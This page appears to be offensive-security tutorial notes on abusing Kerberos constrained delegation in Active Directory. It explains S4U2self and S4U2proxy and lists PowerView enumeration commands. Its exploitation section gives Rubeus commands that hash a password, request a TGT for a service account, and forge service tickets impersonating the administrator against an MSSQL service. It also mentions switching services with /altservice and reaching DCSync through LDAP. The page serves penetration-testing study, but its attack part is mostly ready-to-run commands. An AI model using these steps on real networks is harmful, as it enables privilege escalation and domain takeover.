# Constrained Delegation

## Summary

Using this a Domain admin can **allow** a computer to **impersonate a user or computer** against a **service** of a machine.

* **Service for User to self (**_**S4U2self**_**):** If a **service account** has a _userAccountControl_ value containing TRUSTED\_TO\_AUTH\_FOR\_DELEGATION (T2A4D), then it can obtain a TGS for itself (the service) on behalf of any other user.
* **Service for User to Proxy(**_**S4U2proxy**_**):** A **service account** could obtain a TGS on behalf any user to the service set in **msDS-AllowedToDelegateTo.** To do so, it first need a TGS from that user to itself, but it can use S4U2self to obtain that TGS before requesting the other one.

**Note**: If a user is marked as ‘_Account is sensitive and cannot be delegated_ ’ in AD, you will **not be able to impersonate** them.

This means that if you **compromise the hash of the service** you can **impersonate users** and obtain **access** on their behalf to the **service configured** (possible **privesc**).

Moreover, you **won't only have access to the service that the user is able to impersonate, but also to any service** because the SPN (the service name requested) is not being checked, only privileges. Therefore, if you have access to **CIFS service** you can also have access to **HOST service** using `/altservice` flag in Rubeus.

Also, **LDAP service access on DC**, is what is needed to exploit a **DCSync**.

## Enumeration

{% code overflow="wrap" %}
```powershell
# Enumerating constrained Kerberos delegation
Get-DomainUser -TrustedToAuth
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
```
{% endcode %}

## Exploitation

Note that we do not need to execute in the context of the _IISSvc_ account in order to exploit the account. We only need the password hash. However, if we only have the clear text password, we can use the hash command in Rubeus to generate the NTLM hash as shown below

{% code overflow="wrap" %}
```powershell
# Generating NTLM hash from password
.\Rubeus.exe hash /password:lab
# Requesting TGT for IISSvc
.\Rubeus.exe asktgt /user:iissvc /domain:prod.corp1.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E /nowrap
# Using S4U extensions to request a service ticket
.\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /ptt
# Checking login and permissions on MSSQL
.\SQL.exe
```
{% endcode %}

